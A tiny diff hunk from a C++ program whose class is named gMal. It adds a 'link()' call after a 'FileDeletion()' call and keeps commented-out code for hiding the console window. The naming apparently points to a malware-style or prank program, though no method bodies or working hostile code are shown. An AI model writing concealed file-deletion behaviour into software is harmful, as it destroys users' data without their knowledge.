@@ -128,6 +128,7 @@ void gMal::accptdeny()
 void gMal::questions()
 {
 	jesus.FileDeletion();
+	jesus.link();
 	
 		//HWND hWnd = GetConsoleWindow();
 		//(hWnd, SW_HIDE);
